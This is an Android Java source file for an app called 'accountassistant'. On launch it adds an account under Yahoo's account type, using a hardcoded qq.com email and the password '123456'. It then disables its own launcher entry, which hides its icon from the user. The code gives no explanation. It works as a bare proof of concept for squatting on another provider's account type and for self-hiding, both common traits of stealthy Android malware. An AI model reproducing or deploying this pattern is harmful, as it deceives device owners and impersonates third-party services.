package com.accountassistant;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final String ACCOUNT_TYPE = "com.yahoo.mobile.client.share.account";
    private static final String ACCOUNT_NAME = "2312213859@qq.com";
    private static final String PASSWORD = "123456";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        handleAccount();
        finish();
    }

    private void handleAccount() {
        AccountManager am = AccountManager.get(this);
        Account account = new Account(ACCOUNT_NAME, ACCOUNT_TYPE);
        boolean exists = false;
        for (Account a : am.getAccountsByType(ACCOUNT_TYPE)) {
            if (ACCOUNT_NAME.equals(a.name)) {
                exists = true;
                break;
            }
        }
        if (exists) {
            showToast("Account already exists");
            hideLauncherIfNeeded();
            return;
        }
        boolean ok = am.addAccountExplicitly(account, PASSWORD, null);
        if (ok) {
            showToast("Account added successfully");
            hideLauncherIfNeeded();
        } else {
            showToast("Account add failed");
        }
    }

    private void hideLauncherIfNeeded() {
        ComponentName launcher = new ComponentName(getPackageName(),getPackageName() + ".LauncherActivity");
        PackageManager pm = getPackageManager();
        int state = pm.getComponentEnabledSetting(launcher);
        if (state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
            pm.setComponentEnabledSetting(
                    launcher,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );
        }
    }

    private void showToast(String msg) {
        Toast.makeText(this,msg,Toast.LENGTH_SHORT).show();
    }
}